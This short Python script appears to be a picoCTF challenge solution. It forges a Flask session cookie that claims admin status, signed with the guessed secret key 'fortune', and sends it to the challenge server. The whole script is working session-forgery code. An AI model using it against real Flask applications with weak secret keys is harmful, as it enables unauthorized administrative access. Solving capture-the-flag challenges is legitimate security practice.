import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        session_cookie_structure = dict(
            ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e


payload = "{'very_auth':'admin'}"
url = "http://mercury.picoctf.net:65344/display"
new_cookie = encode('fortune', payload)
r = requests.get(url, cookies={"session": new_cookie})
print(r.text)
